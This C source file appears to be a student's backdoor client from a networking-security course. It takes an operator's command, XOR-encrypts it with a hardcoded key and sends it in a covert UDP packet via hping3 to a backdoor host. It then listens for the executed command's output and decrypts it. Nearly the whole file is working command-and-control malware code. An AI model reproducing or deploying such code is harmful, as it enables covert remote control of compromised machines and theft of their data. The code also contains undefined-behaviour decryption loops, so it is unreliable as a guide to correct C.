#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <strings.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>

#define KEY "8505"
#define BUFSIZE 10000
#define BUFLEN 80
#define SFILENAME "command.backdoor"
#define RFILENAME "info.backdoor"
#define ASN_DIRECTORY "/home/nick/8505A2/"
#define LISTEN_PORT 8000
#define BACKDOOR_SERVER "192.168.0.13"

/*
Packet Sniffer Backdoor Client

Coded by: Miguel Oloresisimo A00752874
		  
This program will:
-request a user input from the user for the command to be executed on the server with backdoor.c.
-place a backdoor code and command in a UDP payload by using hping3 to create and send the packet.
-encrypt the command inputted by the user using XOR encryption.
-create a listening socket to accept a connection from the backdoor
-receive and decrypt the results send by the backdoor containing the output of the command execution
*/

void listen_for_response();
void receive_file(int sd, char *filename);

int main(int argc, char **argv)
{
	FILE *fp;
	char encryptedcommand[BUFSIZE];
	int i=0, key_count=0;
	char *key = KEY;
	char hping_string[BUFSIZE];
	if((fp=fopen(SFILENAME,"wb")) == NULL)
	{
		printf("I cannot open the file %s for writing\n", SFILENAME);
		return 2;
	}
	// Get the command the attacker wants to execute
	printf("ENTER THE COMMAND YOU WANT TO EXECUTE ON THE BACKDOOR: \n");
	fgets(encryptedcommand, BUFSIZE, stdin);

	// Encrpyt the command using XOR encryption
	while(encryptedcommand[i] != '\n')
	{
		encryptedcommand[i] = encryptedcommand[i++] ^ key[key_count++];		
		if(key_count == strlen(key))
			key_count = 0;
	}

	// Insert backdoor code and encrypted command
	fputs("#cmd#", fp);
	fprintf(fp,"%s",encryptedcommand);
	fclose(fp);

	//sprintf(hping_string, "sudo hping3 -c 1 -2 -p 8505 %s -E %s%s -d 100", BACKDOOR_SERVER, ASN_DIRECTORY, SFILENAME);
	sprintf(hping_string, "sudo hping3 -c 1 -2 -p 8505 %s -E %s -d 100", BACKDOOR_SERVER, SFILENAME);	
	printf("%s\n", hping_string);
	// Send a udp packet containing the encrypted command
	system(hping_string);
	
	// Create a socket to listen for incoming connections to get backdoor command results
	listen_for_response();
	return 0;
}

void listen_for_response()
{
	int	n, bytes_to_read;
	int	sd, new_sd, client_len, port;
	struct	sockaddr_in server, client;
	char	*bp, buf[BUFSIZE];

	port = LISTEN_PORT;
	// Create a stream socket
	if ((sd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
		perror ("Can't create a socket");
		exit(1);
	}

	// Bind an address to the socket
	bzero((char *)&server, sizeof(struct sockaddr_in));
	server.sin_family = AF_INET;
	server.sin_port = htons(port);
	server.sin_addr.s_addr = htonl(INADDR_ANY); // Accept connections from any client

	if (bind(sd, (struct sockaddr *)&server, sizeof(server)) == -1)
	{
		perror("Can't bind name to socket");
		exit(1);
	}

	// Listen for connections

	// queue up to 5 connect requests
	listen(sd, 5);

	// Create connection with client
	client_len= sizeof(client);
	if ((new_sd = accept (sd, (struct sockaddr *)&client, &client_len)) == -1)
	{
		fprintf(stderr, "Can't accept client.\n");
		exit(1);
	}
	receive_file(new_sd, RFILENAME);
	close (new_sd);
	close(sd);
}

void receive_file(int sd, char *filename)
{
	char buffer[BUFLEN];
	FILE *fp;
	char *key = KEY;
	int key_count=0, i=0;
	if((fp=fopen(RFILENAME, "wb")) != NULL)
	{
		while(1)
		{
			// Read data coming from other host
			int bytes_read = recv(sd, buffer, BUFLEN, 0);
			if(bytes_read == 0)
				break;

			// Decrypt the data
			while(i < bytes_read)
			{
				buffer[i] = buffer[i++] ^ key[key_count++];		
				if(key_count == strlen(key))
					key_count = 0;
			}	
		
			// Write the decrypted data to file
			fwrite(buffer, sizeof(char), bytes_read, fp);		
		}
		fclose(fp);
		close(sd);
	}
}
